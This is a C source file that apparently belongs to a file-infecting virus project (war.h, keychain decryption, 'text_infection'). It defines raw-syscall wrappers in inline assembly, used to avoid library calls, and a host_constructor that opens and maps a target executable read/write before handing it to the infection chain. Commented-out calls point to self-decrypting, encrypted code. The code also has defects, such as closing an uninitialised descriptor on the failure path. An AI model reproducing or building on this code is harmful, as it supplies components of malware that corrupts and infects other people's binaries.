#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// ASM VOLATILE 
////////////////////////////////////////////////////////////////////////////////

__attribute__((always_inline)) static inline int _open(const char *filename, int flags, mode_t mode)
{
	int ret;

	asm volatile
	(
		"mov rdi, %0\n"
		"mov esi, %1\n"
		"mov edx, %2\n"

		"mov rax, 0x2\n"
		"syscall\n"
		:
		: "g"(filename), "g"(flags), "g"(mode)
	);
	asm volatile
	(
		"mov %0, eax\n"
		: "=r"(ret)
		:
	);

	return ret;
}

__attribute__((always_inline)) static inline int _stat(const char *filename, struct stat *statbuf)
{
	int ret;

	asm volatile
	(
		"mov rdi, %0\n"
		"mov rsi, %1\n"

		"mov rax, 0x4\n"
		"syscall\n"
		:
		: "g"(filename), "g"(statbuf)
	);
	asm volatile
	(
		"mov %0, eax\n"
		: "=r"(ret)
		:
	);

	return ret;
}


__attribute__((always_inline)) static inline void *_mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset)
{
	void *ret;

	asm volatile
	(
		"mov rdi, %0\n"
		"mov rsi, %1\n"
		"mov edx, %2\n"
		"mov r10d, %3\n"
		"mov r8d, %4\n"
		"mov r9, %5\n"

		"mov rax, 0x9\n"
		"syscall\n"
		:
		: "g"(addr), "g"(length), "g"(prot), "g"(flags), "g"(fd), "g"(offset)
		);
	asm volatile
	(
		"mov %0, rax\n"
		: "=r"(ret)
		:
	);

	return ret;
}

__attribute__((always_inline)) static inline int _close(int fd)
{
	int ret;

	asm volatile
	(
		"mov edi, %0\n"
		"mov rax, 3\n"
		"syscall\n"
		:
		: "g"(fd)
	);
	asm volatile
	(
		"mov %0, eax\n"
		: "=r"(ret)
		:
	);

	return ret;
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void host_constructor(struct s_host *host, struct s_keychain *keychain, const char *filename, enum e_context context)
{
	printf("%s\t%s\n",__PRETTY_FUNCTION__, context == SUCCESS ? "success" : "error");
	if (context == FAILURE)
		goto label;

	int fd;
	struct stat statbuf;

	if ((fd = _open(filename, O_RDONLY, 0000)) < 0)
	{
		context = FAILURE;
		goto label;
	}
	if (_stat(filename, &statbuf) < 0)
	{
		context = FAILURE;
		goto label;
	}
	if ((host->header = _mmap(NULL, statbuf.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
	{
		context = FAILURE;
		goto label;
	}

	host->filename = filename;
	host->filesize = statbuf.st_size;

label:
	_close(fd);

//	update_keychain_right(keychain, (char *)host_constructor, (void *)criteria - (void *)host_constructor);
//	decrypt_right(keychain, (char *)criteria, (void *)text_infection - (void *)criteria);

	criteria(host, keychain, context);
}
